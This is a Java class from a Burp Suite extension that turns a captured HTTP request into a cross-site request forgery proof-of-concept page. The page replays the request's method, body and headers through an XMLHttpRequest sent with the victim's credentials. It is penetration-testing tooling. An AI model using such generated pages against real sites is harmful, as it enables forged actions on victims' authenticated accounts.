
package burp.pocs;

import burp.BurpExtender;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.Parameter;
import burp.Util;

/**
 * Ajax CSRF POCs
 * 
 * @author Joaquin R. Martinez <joaquin.ramirez.mtz.lab@gmail.com>
 */
public class AjaxPoc implements IPoc {

    @Override
    public byte[] getPoc(final IHttpRequestResponse request) {
        IExtensionHelpers iexHelpers = BurpExtender.getBurpExtenderCallbacks().getHelpers();
        String lineSeparator = System.lineSeparator();
        StringBuilder pocString = new StringBuilder();
        pocString.append("<!DOCTYPE html>").append(lineSeparator);
        pocString.append("<html>").append(lineSeparator).append("  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->").append(lineSeparator);
        pocString.append("<body>").append(lineSeparator).append("    <script>\n      function submitRequest()").append(lineSeparator);
        pocString.append("      {").append(lineSeparator).append("        var xhr = new XMLHttpRequest();").append(lineSeparator);
        String method;
        IRequestInfo requestInfo = iexHelpers.analyzeRequest(request);
        method = requestInfo.getMethod();
        pocString.append("        xhr.open(\"").append(method).append("\", \"");

        if ("GET".equals(method)) {
            pocString.append(request.getUrl()).append("\", true);").append(lineSeparator);
            pocString.append("        xhr.send();\n");
        } else {
            pocString.append(request.getUrl()).append("\", true);").append(lineSeparator);
            String body = iexHelpers.bytesToString(request.getRequest()).substring(requestInfo.getBodyOffset());
            body = Util.escapeBackSlashes(body);
            body = Util.escapeDoubleQuotes(body);
            String accept = "xt/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
            String content = "text/plain";
            String language = "es-ES,es;q=0.8";
            for (Parameter next : Util.parseHeaderList(requestInfo.getHeaders())) {
                if ("Accept".equals(next.getName())) {
                    accept = next.getValue();
                }
                if ("Content-Type".equals(next.getName())) {
                    content = next.getValue();
                }
                if ("Accept-Language".equals(next.getName())) {
                    language = next.getValue();
                }
            }
            pocString.append("        xhr.setRequestHeader(\"Accept\", \"").append(accept).append("\");").append(lineSeparator);
            pocString.append("        xhr.setRequestHeader(\"Content-Type\", \"").append(content).append("\");").append(lineSeparator);
            pocString.append("        xhr.setRequestHeader(\"Accept-Language\", \"").append(language).append("\");").append(lineSeparator);
            pocString.append("        xhr.withCredentials = true;").append(lineSeparator).append("        var body = ");

            if (requestInfo.getContentType() == IRequestInfo.CONTENT_TYPE_MULTIPART) {
                String[] lines = body.split("\r\n");
                for (int i = 0; i < lines.length; i++) {
                    String line = lines[i];
                    if (i == lines.length - 1) {
                        pocString.append("\"").append(line).append("\\r\\n\";").append(lineSeparator);
                    } else {
                        pocString.append("\"").append(line).append("\\r\\n\" +").append(lineSeparator);
                    }
                }
            } else {
                pocString.append("\"").append(body).append("\";").append(lineSeparator);
            }
            pocString.append("        var aBody = new Uint8Array(body.length);").append(lineSeparator);
            pocString.append("        for (var i = 0; i < aBody.length; i++)").append(lineSeparator);
            pocString.append("          aBody[i] = body.charCodeAt(i); ").append(lineSeparator);
            pocString.append("        xhr.send(new Blob([aBody]));").append(lineSeparator);
        }
        pocString.append("      }").append(lineSeparator).append("    </script>\n    <form action=\"#\">").append(lineSeparator);
        pocString.append("      <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" />").append(lineSeparator);
        pocString.append("    </form>").append(lineSeparator).append("  </body>").append(lineSeparator).append("</html>");
        return pocString.toString().getBytes();
    }
    
}
